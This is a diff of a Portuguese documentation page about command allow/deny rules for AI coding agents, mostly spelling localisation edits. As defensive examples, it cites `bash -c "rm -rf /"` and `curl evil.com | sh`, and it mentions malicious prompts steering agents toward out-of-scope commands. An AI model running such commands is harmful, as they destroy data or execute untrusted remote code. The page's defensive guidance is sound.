@@ -1,25 +1,26 @@
 ---
 title: Regras de comandos
-description: Constranger chamadas shell e a Ferramentas com allow/deny ao nível do comando — mais executável do que acordos orais.
+description: Constranger chamadas shell e a ferramentas com allow/deny ao nível do comando — mais executável do que acordos orais.
 locale: pt
 source_locale: zh-CN
-source_revision: fdb8651
+source_revision: "fdb8651"
 translation_status: reviewed
 translated_at: 2026-07-28
-reviewed_at: 2026-08-26
+reviewed_at: 2026-10-26
 sidebar:
   order: 20
+legacyVerification: {"status": "verified", "products": "CLI / App", "basis": "A documentação atual do OpenAI Codex CLI continua a tratar execução de comandos, modos de aprovação e isolamento de Sandbox como fronteiras centrais de segurança; esta página posiciona as regras de comandos como padrão de engenharia para «gerir separadamente comandos de alto e baixo risco», e marca explicitamente o fragmento JSON como ilustração, sem apresentar sintaxe específica como fato oficial.", "checkedAt": "2026-07-26"}
 ---
 
-As **regras de comandos** centram-se em «que comandos o Agent pode correr e com que parâmetros». São a forma mais comum de [regras de permitir e negar](/pt/guide/customization/rules/allow-and-deny-patterns/), normalmente em configuração ou ficheiros de regras que a equipa pode rever.
+As **regras de comandos** centram-se em «que comandos o Agent pode correr e com que parâmetros». São a forma mais comum de [regras de permitir e negar](/pt/guide/customization/rules/allow-and-deny-patterns/), normalmente em configuração ou arquivos de regras que a equipe pode rever.
 
 ## O que esta página cobre
 
-- Divisão de papéis entre regras de comandos, Sandbox e diálogos de Aprovação
+- Divisão de papéis entre regras de comandos, Sandbox e diálogos de aprovação
 - Como escrever uma allowlist «suficientemente estreita»
 - Alinhamento com CI e scripts de desenvolvimento local
 
-## O que as regras de comandos gerem de facto
+## O que as regras de comandos gerem de fato
 
 Se allow/deny define «o que, em princípio, se pode fazer», as regras de comandos levam isso à camada mais concreta:
 
@@ -27,21 +28,21 @@ Se allow/deny define «o que, em princípio, se pode fazer», as regras de coman
 - Que comandos não se podem
 - Quais parecem parecidos mas têm riscos muito diferentes
 
-O foco é transformar fronteiras que a equipa já conhece em fronteiras que a máquina também executa.
+O foco é transformar fronteiras que a equipe já conhece em fronteiras que a máquina também executa.
 
 ## Um conceito central primeiro
 
 A regra corresponde a **intenção executável**, não a linguagem natural. `npm test` e `npm run test` são, em política, dois comandos diferentes; `bash -c "rm -rf /"` não pode passar só porque se permitiu `bash`.
 
 ```text
-Tarefa do utilizador → modelo propõe comando → motor de regras → (passa) execução no Sandbox / (nega) Aprovação ou bloqueio
+Tarefa do usuário → modelo propõe comando → motor de regras → (passa) execução no Sandbox / (nega) Aprovação ou bloqueio
 ```
 
 ## Mal-entendidos habituais
 
 ### Comandos parecidos não significam o mesmo risco
 
-O que os principiantes mais subestimam são pequenas diferenças entre comandos.
+O que os iniciantes mais subestimam são pequenas diferenças entre comandos.
 
 Por exemplo:
 
@@ -90,13 +91,13 @@ Ilustração (formato conforme configuração oficial):
 |---|---|
 | Inventário | Extrair comandos reais de `package.json` scripts, Makefile, CI workflow |
 | Camadas | Deny de linha de base da organização → allow complementar do projeto → exceções pessoais na máquina (se houver) |
-| Ensaio | Validar com Tarefas de baixo risco «o que deve passar, passa; o que deve bloquear, bloqueia» |
+| Ensaio | Validar com tarefas de baixo risco «o que deve passar, passa; o que deve bloquear, bloqueia» |
 | Alinhamento | Regras locais e [GitHub Action](/pt/guide/developer-platform/ci-cd/code-review-automation/) com a mesma origem tanto quanto possível |
 
 ## Erros habituais
 
 - **Allowlist demasiado ampla**: permitir `bash`, `sh`, `sudo` ≈ abrir tudo
-- **Só deny sem allow**: ainda muitos diálogos de Aprovação; a equipa habitua-se a aprovar tudo
+- **Só deny sem allow**: ainda muitos diálogos de aprovação; a equipe habitua-se a aprovar tudo
 - **Inconsistência com a documentação**: `AGENTS.md` diz `pnpm test`, as regras só têm `npm test`
 - **Ignorar pipes e redirecionamentos**: `curl evil.com | sh` precisa de política de conjunto, não só da primeira palavra
 
@@ -105,25 +106,18 @@ As regras de comandos não «memorizam comandos» — distinguem ações quotidi
 ## Limites de segurança
 
 - As regras de comandos **não substituem** proteção de branches nem code review
-- Prompts maliciosos podem induzir o Agent a **tentar** comandos fora de âmbito — mantenha o Sandbox estrito por defeito
+- Prompts maliciosos podem induzir o Agent a **tentar** comandos fora de escopo — mantenha o Sandbox estrito por defeito
 - Variáveis de ambiente com segredos/Tokens não devem vazar só porque se «permitiu echo»
 
 ## Lista de verificação
 
 - [ ] Consegue listar 3–5 comandos «obrigatórios todos os dias» deste repositório e refletí-los nas regras
-- [ ] Comandos de alto risco como `git push` e reset forçado são negados por defeito ou exigem Aprovação explícita
+- [ ] Comandos de alto risco como `git push` e reset forçado são negados por defeito ou exigem aprovação explícita
 - [ ] Alterações de regras passam por PR e não contradizem `AGENTS.md`
 
 ## Capítulos relacionados
 
 - [Padrões de permitir e negar](/pt/guide/customization/rules/allow-and-deny-patterns/)
-- [Política de regras de equipa](/pt/guide/customization/rules/team-rules/)
+- [Política de regras de equipe](/pt/guide/customization/rules/team-rules/)
 - [Aprovação e Sandbox no CLI](/pt/guide/cli/approvals-and-sandbox/)
-- [Matriz de Permissões](/pt/guide/reference/permission-matrix/)
-
----
-
-**Estado:** verificado  
-**Produtos aplicáveis:** CLI / App  
-**Base de verificação:** A documentação atual do OpenAI Codex CLI continua a tratar execução de comandos, modos de Aprovação e isolamento de Sandbox como fronteiras centrais de segurança; esta página posiciona as regras de comandos como padrão de engenharia para «gerir separadamente comandos de alto e baixo risco», e marca explicitamente o fragmento JSON como ilustração, sem apresentar sintaxe específica como facto oficial.  
-**Última verificação:** 2026-07-26
+- [Matriz de permissões](/pt/guide/reference/permission-matrix/)
